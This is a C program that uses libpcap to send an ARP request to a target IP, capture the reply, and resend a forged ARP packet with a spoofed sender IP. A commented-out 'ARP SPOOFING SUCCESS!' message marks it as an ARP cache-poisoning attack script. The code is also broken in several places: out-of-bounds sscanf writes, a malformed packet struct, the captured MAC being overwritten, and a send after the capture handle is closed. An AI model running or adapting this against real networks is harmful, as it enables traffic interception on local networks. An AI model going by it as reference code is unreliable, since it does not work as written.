#include <stdio.h>
#include <pcap.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <ctype.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <stdint.h>
#include <string.h>

struct sniff_arp {
	u_char eth_smac[6];
	u_char  eth_dmac[6];
	u_short	eth_type;
	u_short arp_htype; /*hardware type*/
	u_short arp_p; /*protocol*/
	u_char arp_hsize; /*hardware size*/
	u_char arp_psize; /*protocol size*/
	u_short arp_opcode; /*opcode*/
	u_char arp_smac[6]; /*sender mac address*/
	u_char arp_sip[4]; /*sender ip address*/
	u_char arp_dmac[6]; /*target mac address*/
	int arp_dmac2[6];
	u_char arp_dip[4]; /*target ip address*/
};

int main(int argc, char *argv[])
{
	pcap_t *handle;			/*session handle*/
	char *dev;			/*The device to sniff on*/
	char errbuf[PCAP_ERRBUF_SIZE];	/*Error string*/
	struct bpf_program fp;		/*The compiled filter*/
	char filter_exp[] = "arp";	/*The filter expression*/
	bpf_u_int32 mask;		/*Our netmask*/
	bpf_u_int32 net;		/*Our IP*/
	struct pcap_pkthdr *header;	/*The header that pcap gives us*/
	int success;		/*The actual success*/

	struct sniff_arp arp;

	const u_char *pkt_data;
	int idx,j=0;
	u_char temp[6];
	
//	struct ip *ip_hdr;
//	struct tcphdr *tcph;

	
	/*Define the device*/
	dev = pcap_lookupdev(errbuf);
	if(dev == NULL) {
		fprintf(stderr, "Couldn't find default device: %s \n", errbuf);
		return (2);
	}
	
	/*Find the properties for the device*/
	if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
		{
			fprintf(stderr, "Couldn't open device %s \n", dev, errbuf);
			net = 0;
			mask = 0;
		}
	/*Open the Session in promiscous mode*/
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL)
		{
			fprintf(stderr, "Couldn't open device %s: %s \n", dev, errbuf);
			return(2);
		}
	/*compile and apply the filter*/
	if (pcap_compile(handle, &fp, filter_exp,0,net) == -1)
		{
			fprintf(stderr, "Couldn't parse filter %s \n", filter_exp, pcap_geterr(handle));
			return(2);
		}
	if(pcap_setfilter(handle, &fp) == -1)
		{
			fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
			
			return (2);
		}

	sscanf(argv[2], "%d.%d.%d.%d", &arp.arp_dip[0], &arp.arp_dip[1], &arp.arp_dip[2], &arp.arp_dip[3]);
	char *NIC = argv[1];

/*
	FILE *fp_ip;
	char i_buff[256];
	fp_ip = popen("ifconfig eth0 | grep inet", "r");
	fgets(i_buff, 255, fp_ip);
	pclose(fp_ip);
	sscanf(i_buff, "%d.%d.%d.%d", &arp.arp_sip[0], &arp.arp_sip[1], &arp.arp_sip[2], &arp.arp_sip[3]);

	printf("%d", i_buff);
	FILE *fp_mac;
	char m_buff[256];
	fp_mac = popen("ifconfig eth0 | grep ether", "r");
	fgets(m_buff, 255, fp_mac);
	pclose(fp_mac);
	sscanf(fp_mac, "%x:%x:%x:%x:%x:%x", &arp.eth_smac[0], &arp.eth_smac[1], &arp.eth_smac[2], &arp.eth_smac[3], &arp.eth_smac[4], &arp.eth_smac[5]);
*/

	/*arp.eth_dmac[0] = 0xFF;
	arp.eth_dmac[1] = 0xFF;
	arp.eth_dmac[2] = 0xFF;
	arp.eth_dmac[3] = 0xFF;
	arp.eth_dmac[4] = 0xFF;
	arp.eth_dmac[5] = 0xFF;
	*/
	memcpy(arp.eth_dmac , "\xff\xff\xff\xff\xff\xff" , 6);
	memcpy(arp.eth_smac, "\x00\x0c\x29\x93\x73\x3c",6);
	memcpy(arp.arp_sip, "\xc0\xa8\x3a\x86",4);
	arp.eth_type = htons(0x0806);
	arp.arp_htype = htons(1);
	arp.arp_p = htons(0x0800);

	arp.arp_hsize = 0x06;
	arp.arp_psize = 0x04;
	arp.arp_opcode = htons(0x0001);
	memcpy(arp.arp_smac,arp.eth_smac,sizeof(arp.eth_smac));
	memcpy(arp.arp_dmac,arp.eth_dmac,sizeof(arp.eth_dmac));

	int fd = pcap_sendpacket(handle, (u_char *)&arp, sizeof(arp));
	if (fd == -1)
		printf("error\n");

//	printf("%x %x %x %x %x %x \n\n", &arp.eth_smac[0], &arp.eth_smac[1], &arp.eth_smac[2], &arp.eth_smac[3], &arp.eth_smac[4], &arp.eth_smac[5]);
//	printf("%d %d %d %d \n\n", &arp.arp_sip[0], &arp.arp_sip[1], &arp.arp_sip[2], &arp.arp_sip[3]);
	/*Grab a success*/

	if(success = pcap_next_ex(handle, &header, &pkt_data)>=0)
	{	
		for(int i=22; i<=27; i++) {
			printf("%x",(*(pkt_data + i)));
			arp.eth_dmac[j] = (*(pkt_data + i));
			j++;
		}
		printf("\n");
	}
	pcap_close(handle);
/*
	arp.arp_dmac2[0] = temp[0];
	arp.arp_dmac2[1] = temp[1];
	arp.arp_dmac2[2] = temp[2];
	arp.arp_dmac2[3] = temp[3];
	arp.arp_dmac2[4] = temp[4];
	arp.arp_dmac2[5] = temp[5];
*/
	memcpy(arp.eth_dmac,arp.arp_dmac,6);
	memcpy(arp.arp_sip, "\xc0\xa8\x3a\x02",4);

	printf("%x \n", arp.arp_dmac2);
	printf("%x \n", temp[2]);

	fd = pcap_sendpacket(handle, (u_char *)&arp, sizeof(arp));
	if (fd == -1)
		printf("error\n");

/*	{
		printf("ARP SPOOFING SUCCESS!");
	}
*/
	return(0);
}		
	
	
	
